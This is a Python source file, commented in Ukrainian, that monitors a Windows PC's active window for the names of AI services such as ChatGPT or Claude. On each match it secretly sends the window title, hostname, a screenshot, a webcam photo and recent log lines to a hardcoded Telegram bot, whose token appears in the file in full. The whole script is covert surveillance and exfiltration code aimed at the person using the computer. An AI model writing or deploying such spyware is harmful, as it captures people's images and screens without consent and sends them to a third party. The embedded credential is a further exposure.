#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
telegram_notify.py — Telegram-сповіщення при виявленні AI-сайту

Надсилає при спрацюванні:
  ✅ Текстове повідомлення (час, ПК, заголовок вікна)
  ✅ Скріншот екрану
  ✅ Фото з вебкамери
  ✅ Лог із visits_simple.txt (якщо існує)

Залежності:
    pip install requests pywin32 psutil pillow opencv-python

Налаштування:
    1. Створи бота через @BotFather → отримай BOT_TOKEN
    2. Напиши боту будь-яке повідомлення
    3. Відкрий https://api.telegram.org/bot<BOT_TOKEN>/getUpdates → знайди "chat":{"id":...}
    4. Встав BOT_TOKEN та CHAT_ID нижче
"""

import time
import sys
import os
import requests
import psutil
from datetime import datetime

try:
    import win32gui
    import win32process
except ImportError:
    print("Помилка: встанови pywin32 -> pip install pywin32")
    sys.exit(1)

try:
    from PIL import ImageGrab
except ImportError:
    print("Помилка: встанови Pillow -> pip install pillow")
    sys.exit(1)

try:
    import cv2
except ImportError:
    print("Помилка: встанови opencv-python -> pip install opencv-python")
    sys.exit(1)

# ============================================================
#  НАЛАШТУВАННЯ
# ============================================================
BOT_TOKEN = "7958251642:AAFVXIT6KNmzznnlKTjEZw_ObbOiSiGU_dc"
CHAT_ID   = "-1003804960180r"

STOP_WORDS = [
    "chatgpt", "openai", "gemini", "bard", "claude",
    "deepseek", "grok", "copilot", "perplexity", "anthropic",
    "mistral", "characterai", "huggingface"
]

# Шлях до visits_simple.txt (за замовчуванням — поруч зі скриптом)
VISITS_LOG_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), "visits_simple.txt")

CHECK_INTERVAL = 1.0    # секунди між перевірками
COOLDOWN       = 15     # секунд між повторними сповіщеннями для того самого вікна
WEBCAM_INDEX   = 0      # індекс камери (0 = вбудована)
# ============================================================

TELEGRAM_API = f"https://api.telegram.org/bot{BOT_TOKEN}"
TEMP_DIR     = os.environ.get("TEMP", ".")

last_notified_title = None
last_notified_time  = 0


# ────────────────────────────────────────────────────────────
#  Утиліти
# ────────────────────────────────────────────────────────────

def get_active_window_info():
    try:
        hwnd      = win32gui.GetForegroundWindow()
        pid       = win32process.GetWindowThreadProcessId(hwnd)[1]
        title     = win32gui.GetWindowText(hwnd)
        proc_name = ""
        try:
            proc_name = psutil.Process(pid).name().lower()
        except Exception:
            pass
        return {"pid": pid, "title": title, "process": proc_name}
    except Exception:
        return None


def detect_ai(title: str):
    t = title.lower()
    for word in STOP_WORDS:
        if word in t:
            return word
    return None


def take_screenshot():
    try:
        img  = ImageGrab.grab()
        path = os.path.join(TEMP_DIR, "ai_screenshot.png")
        img.save(path)
        return path
    except Exception as e:
        print(f"[screenshot] Помилка: {e}")
        return None


def take_webcam_photo():
    try:
        cam = cv2.VideoCapture(WEBCAM_INDEX)
        time.sleep(0.3)
        ret, frame = cam.read()
        cam.release()
        if not ret:
            print("[webcam] Не вдалося зробити знімок")
            return None
        path = os.path.join(TEMP_DIR, "ai_webcam.jpg")
        cv2.imwrite(path, frame)
        return path
    except Exception as e:
        print(f"[webcam] Помилка: {e}")
        return None


def get_recent_log_lines(n=10):
    """Повертає останні n рядків із visits_simple.txt або None."""
    if not os.path.isfile(VISITS_LOG_PATH):
        return None
    try:
        with open(VISITS_LOG_PATH, "r", encoding="utf-8") as f:
            lines = f.readlines()
        recent = lines[-n:] if len(lines) >= n else lines
        return "".join(recent).strip() or None
    except Exception as e:
        print(f"[log] Помилка читання: {e}")
        return None


def cleanup(*paths):
    for p in paths:
        if p:
            try:
                os.remove(p)
            except Exception:
                pass


# ────────────────────────────────────────────────────────────
#  Telegram
# ────────────────────────────────────────────────────────────

def tg_send_text(text: str):
    try:
        requests.post(
            f"{TELEGRAM_API}/sendMessage",
            json={"chat_id": CHAT_ID, "text": text, "parse_mode": "HTML"},
            timeout=10
        )
    except Exception as e:
        print(f"[telegram] Помилка тексту: {e}")


def tg_send_photo(path: str, caption: str = ""):
    try:
        with open(path, "rb") as f:
            requests.post(
                f"{TELEGRAM_API}/sendPhoto",
                data={"chat_id": CHAT_ID, "caption": caption},
                files={"photo": f},
                timeout=15
            )
    except Exception as e:
        print(f"[telegram] Помилка фото: {e}")


# ────────────────────────────────────────────────────────────
#  Головне сповіщення
# ────────────────────────────────────────────────────────────

def notify(title: str, keyword: str, proc: str):
    now_str  = datetime.now().strftime("%d.%m.%Y %H:%M:%S")
    hostname = os.environ.get("COMPUTERNAME", "невідомий ПК")

    # 1. Текстове повідомлення
    text = (
        f"🚨 <b>AI-сайт виявлено!</b>\n\n"
        f"🕐 <b>Час:</b> {now_str}\n"
        f"💻 <b>ПК:</b> {hostname}\n"
        f"🔍 <b>Ключове слово:</b> {keyword}\n"
        f"🪟 <b>Заголовок вікна:</b> {title}\n"
        f"⚙️ <b>Процес:</b> {proc}"
    )
    tg_send_text(text)

    # 2. Скріншот екрану
    screenshot = take_screenshot()
    if screenshot:
        tg_send_photo(screenshot, caption=f"🖥 Скріншот — {now_str}")

    # 3. Фото з вебкамери
    webcam = take_webcam_photo()
    if webcam:
        tg_send_photo(webcam, caption=f"📷 Вебкамера — {now_str}")

    # 4. Останні рядки з visits_simple.txt
    log_lines = get_recent_log_lines(10)
    if log_lines:
        tg_send_text(
            f"📋 <b>Останні записи visits_simple.txt:</b>\n\n<pre>{log_lines}</pre>"
        )

    cleanup(screenshot, webcam)


# ────────────────────────────────────────────────────────────
#  Основний цикл
# ────────────────────────────────────────────────────────────

def monitor_loop():
    global last_notified_title, last_notified_time

    print("Telegram-сповіщувач запущено.")
    print(f"  Слова:    {', '.join(STOP_WORDS)}")
    print(f"  Лог:      {VISITS_LOG_PATH}")
    print(f"  Інтервал: {CHECK_INTERVAL}s  |  Cooldown: {COOLDOWN}s\n")

    while True:
        info = get_active_window_info()
        if info:
            title   = info["title"]
            keyword = detect_ai(title)

            if keyword:
                now = time.time()
                if title != last_notified_title or (now - last_notified_time) > COOLDOWN:
                    ts = datetime.now().strftime("%H:%M:%S")
                    print(f"[{ts}] Виявлено: {keyword!r} у «{title}»")
                    notify(title, keyword, info["process"])
                    last_notified_title = title
                    last_notified_time  = now

        time.sleep(CHECK_INTERVAL)


if __name__ == "__main__":
    try:
        monitor_loop()
    except KeyboardInterrupt:
        print("\nЗупинено.")
        sys.exit(0)